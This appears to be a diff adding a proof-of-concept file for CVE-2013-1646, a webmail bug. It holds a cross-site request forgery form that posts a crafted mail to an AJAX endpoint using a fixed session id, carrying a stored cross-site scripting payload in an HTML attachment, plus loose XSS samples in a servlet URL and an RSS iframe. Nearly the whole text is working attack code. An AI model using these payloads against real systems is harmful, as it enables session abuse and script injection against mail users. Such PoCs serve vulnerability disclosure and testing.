@@ -1,0 +1,37 @@
+<html>
+<head>
+<title>PoC for Bug 24553 CVE-2013-1646</title>
+</head>
+<body>
+<form 
+action="https://www.example.com/ajax/mail?action=new&session=158f81fc344349ecaf638259a4301028" 
+method="POST" enctype="multipart/form-data">
+<input type="hidden" name="json_0" value="{"from":"Joe Doe 
+<jdoe@ox&#46;example.com>","to":"Joe Doe&#32;
+<jdoe (at) ox.example (dot) com [email concealed]>","cc":
+"","bcc":"","subject"
+;:"aaaa","priority":"3",&q
+uot;attachments":[{"content_type":&q
+uot;TEXT/HTML","content":"<html>&l
+t;body style=\u0022\u0022><div>ABCD</div
+>\u000a<div>&#160;</div></scri
+pt>
+
+<script>alert(String.fromCharCode(88&#
+44;83,83,32,98,121,32,105,116,46,115
+,101,99))</script>
+
+<pre onsubm
+it=""/><div>ABCD</div></body
+></html>"}],"datasources":&
+#91;]}" />
+<input type="submit" value="Submit form" />
+</form>
+</body>
+</html>
+
+http://www.example.com/servlet/TestServlet?foo=<script>alert('xss')</script>
+
+<content:encoded>
+<iframe src="javascript:alert('xss injection via RSS');" />
+</content>
